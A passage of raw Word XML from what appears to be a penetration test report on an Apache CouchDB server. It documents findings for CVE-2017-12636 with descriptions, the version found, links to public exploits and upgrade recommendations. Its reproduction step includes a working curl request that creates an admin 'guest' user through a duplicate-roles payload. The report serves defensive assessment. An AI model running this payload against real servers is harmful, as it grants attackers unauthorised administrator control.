          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Upgrade Apache Couch Db to v3.2.2 or later</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BE007A" w:rsidRDefault="00BE007A" w:rsidP="00BE007A">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="006163C5" w:rsidRDefault="006163C5" w:rsidP="006163C5">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="21" w:name="_Toc143392744"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Steps to Reproduce</w:t>
      </w:r>
      <w:bookmarkEnd w:id="21"/>
    </w:p>
    <w:p w:rsidR="00BE007A" w:rsidRDefault="006163C5" w:rsidP="002070FF">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">1. Run the </w:t>
      </w:r>
      <w:r w:rsidR="002070FF">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>curl command:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002070FF" w:rsidRPr="002070FF" w:rsidRDefault="002070FF" w:rsidP="002070FF">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>curl -X PUT http://</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>10.10.10.10</w:t>
      </w:r>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>:5984/_users/org.couchdb.user:guest \</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002070FF" w:rsidRPr="002070FF" w:rsidRDefault="002070FF" w:rsidP="002070FF">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">    -H "Accept: application/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>json</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>" \</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002070FF" w:rsidRPr="002070FF" w:rsidRDefault="002070FF" w:rsidP="002070FF">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">    -H "Content-Type: application/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>json</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>" \</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRDefault="002070FF" w:rsidP="00DC2939">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002070FF">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">    -d '{"name": "guest", "password": "guest", "roles": ["_admin"], "roles": [], "type": "user"}'</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DC2939" w:rsidRDefault="00DC2939" w:rsidP="00DC2939">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00DC2939" w:rsidRDefault="00DC2939" w:rsidP="00DC2939">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>2. Now the hacker should be able to use the user guest with:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DC2939" w:rsidRDefault="00DC2939" w:rsidP="00DC2939">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:tab/>
        <w:t>Username: guest</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DC2939" w:rsidRDefault="00DC2939" w:rsidP="00DC2939">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:tab/>
        <w:t>Password: guest</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DC2939" w:rsidRDefault="00DC2939" w:rsidP="00DC2939">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00DC2939" w:rsidRDefault="00DC2939" w:rsidP="00DC2939">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">To access the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>CouchDB</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> with administrator permissions</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DC2939" w:rsidRDefault="00DC2939" w:rsidP="00DC2939">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00DC2939" w:rsidRDefault="00DC2939" w:rsidP="00DC2939">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="22" w:name="_Toc143392745"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">Finding 4: CVE-2017-12636 (Apache </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>CouchDB</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> &lt; 1.7.0 and 2.x &lt; 2.1.1) – </w:t>
      </w:r>
      <w:r w:rsidR="00C016F1" w:rsidRPr="00C016F1">
        <w:rPr>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:highlight w:val="red"/>
        </w:rPr>
        <w:t>HIGH</w:t>
      </w:r>
      <w:bookmarkEnd w:id="22"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DC2939" w:rsidRPr="00842A49" w:rsidRDefault="00DC2939" w:rsidP="00DC2939"/>
    <w:p w:rsidR="00DC2939" w:rsidRDefault="00DC2939" w:rsidP="00DC2939">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:tabs>
          <w:tab w:val="left" w:pos="6618"/>
        </w:tabs>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Vulnerability Description:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DC2939" w:rsidRDefault="00DC2939" w:rsidP="00DC2939">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:after="160" w:line="259" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="212529"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="212529"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>CouchDB</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="212529"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> administrative users can configure the database server via HTTP(S). Some of the configuration options include paths for operating system-level binaries that are subsequently launched by </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="212529"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>CouchDB</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="212529"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">. This allows an admin user in Apache </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="212529"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>CouchDB</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="212529"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> before 1.7.0 and 2.x before 2.1.1 to execute arbitrary shell commands as the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="212529"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>CouchDB</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="212529"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> user, including downloading and executing scripts from the public internet.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DC2939" w:rsidRDefault="00DC2939" w:rsidP="00DC2939">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:after="160" w:line="259" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00DC2939" w:rsidRDefault="00DC2939" w:rsidP="00DC2939">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Exposure/Analysis:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DC2939" w:rsidRDefault="00DC2939" w:rsidP="00DC2939">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Access link: </w:t>
      </w:r>
      <w:hyperlink r:id="rId18" w:history="1">
        <w:r w:rsidRPr="007C6340">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>http://10.10.10.10:5984</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00DC2939" w:rsidRDefault="00DC2939" w:rsidP="00DC2939">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Current Apache </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>CouchDB</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> version: 1.6.0</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DC2939" w:rsidRDefault="00DC2939" w:rsidP="00DC2939">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:after="160" w:line="259" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">This vulnerability has </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>a public exploit execution code guidelines</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC2939">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>https://github.com/vulhub/vulhub/blob/master/couchdb/CVE-2017-12636/README.md</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DC2939" w:rsidRDefault="00DC2939" w:rsidP="00DC2939">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:after="160" w:line="259" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00DC2939" w:rsidRDefault="00DC2939" w:rsidP="00DC2939">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBd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Recommendations:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DC2939" w:rsidRDefault="00DC2939" w:rsidP="00DC2939">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F83D6A">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Upgrade Apache Couch Db to v3.2.2 or later</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DC2939" w:rsidRDefault="00DC2939" w:rsidP="00DC2939">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00DC2939" w:rsidRDefault="00DC2939" w:rsidP="00DC2939">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="23" w:name="_Toc143392746"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Steps to Reproduce</w:t>
      </w:r>
      <w:bookmarkEnd w:id="23"/>
    </w:p>
    <w:p w:rsidR="00DC2939" w:rsidRPr="00673193" w:rsidRDefault="00DC2939" w:rsidP="00DC2939">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>1.</w:t>
      </w:r>
      <w:r w:rsidR="00673193" w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Run the python script</w:t>
      </w:r>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00673193" w:rsidRDefault="00673193" w:rsidP="00DC2939">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Note: This script is modified to work in our case from the one on this link: </w:t>
      </w:r>
      <w:hyperlink r:id="rId19" w:history="1">
        <w:r w:rsidRPr="00BF6DCD">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>https://github.com/vulhub/vulhub/blob/master/couchdb/CVE-2017-12636/exp.py</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00673193" w:rsidRDefault="00673193" w:rsidP="00DC2939">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00673193" w:rsidRDefault="00673193" w:rsidP="00DC2939">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00DC2939" w:rsidRPr="00673193" w:rsidRDefault="00673193" w:rsidP="00DC2939">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:b/>
          <w:sz w:val="24"/>
